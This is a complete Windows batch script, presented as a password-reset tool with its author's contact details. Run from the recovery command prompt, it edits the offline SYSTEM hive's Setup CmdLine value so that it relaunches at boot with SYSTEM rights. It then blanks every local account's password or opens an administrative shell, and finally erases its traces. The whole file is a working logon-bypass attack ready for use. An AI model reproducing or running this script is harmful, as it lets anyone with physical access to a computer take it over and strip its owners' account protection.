@echo off && SETLOCAL ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION  && TITLE ALFA.NET PASSWORD RESET..SL GMS BRO & color 4e & echo. & ECho Made by -Gayan Madhuwantha Sonnadara & echo tel - +94767335913 & echo E mail - madhuwanthagayan43@gmail.com & echo. & echo. & echo Removing passwords from all accounts at once & echo ============================================= & echo. & echo. 
set STR=%~d0 & (call :Uppercase STR)
IF EXIST "c:\reset.bat" ( color 0A  & Echo *** Bypass Done Wait for the program to run & echo. & call :Start ) else ( IF EXIST "c:\windows" ( echo How to use?  & echo ----------------------------  & echo 01. Press the shift key from the lock screen and restart the computer. &  echo 02. Run this program from the command line interface ^(Troubleshoot-^>Advanced Option-^>Command prompt^) & echo 03. ^<Drive^>:\^<name.bat^> Enter ^(EX-"D:\unlock.bat"^) OR Type notepad ctrl^+o use open this.^! & echo 04. Restart the computer & echo. & pause & exit ) else ( for %%a in (A B C D E F G H I J K L M N O P Q R S T U V W Y Z) DO ( IF EXIST "%%a:\Windows\System32\config\SYSTEM" (color 1e & REG LOAD HKLM\P_reset "%%a:\Windows\System32\config\SYSTEM" & REG add "HKLM\P_reset\Setup" /v "CmdLine" /t REG_SZ /d "c:\reset.bat" /f & REG add "HKLM\P_reset\Setup" /v "SetupType" /t REG_DWORD /d "2" /f & REG UNLOAD HKLM\P_reset & copy "%~s0" "%%a:\reset.bat" /y  )))) & goto :EOF
:Uppercase
set %~1=!%1:C=c! & goto :EOF
:Start
echo ........ & echo R = All Account REset password & echo C = CMD OPEN & echo N = notepad M = Manager & echo S = Skip & echo.
choice /t 30 /c rcnms /d r /n /m " Wait 30s- OR SKIP Enter (S)  -" 
(if %errorlevel%==1  call :rp) & (if %errorlevel%==2  call :cmd) & (if %errorlevel%==3 call :not) & (if %errorlevel%==4 call :net) & (if %errorlevel%==5 call :can) & Reg add "HKLM\SYSTEM\Setup" /v "CmdLine" /t REG_SZ /d "" /f>nul & Reg add "HKLM\SYSTEM\Setup" /v "SetupType" /t REG_DWORD /d "0" /f>nul & del "c:\reset.bat">nul & exit & goto :EOF
:rp
for /f "SKIP=2 TOKENS=1 DELIMS=- " %%G in ('net user') do net user %%G "">nul & for /f "SKIP=2 TOKENS=2 DELIMS= " %%G in ('net user') do net user %%G "">nul & for /f "SKIP=2 TOKENS=3 DELIMS= " %%G in ('net user') do  net user %%G "">nul
exit /b 0
:cmd
color 0f & Reg add "HKLM\SYSTEM\Setup" /v "CmdLine" /t REG_SZ /d "" /f>nul & Reg add "HKLM\SYSTEM\Setup" /v "SetupType" /t REG_DWORD /d "0" /f>nul & del "c:\reset.bat">nul & cls & cmd.exe & exit /b 0
:net
Netplwiz.exe & exit /b 0
:not
notepad.exe & exit /b 0
:can
exit /b 0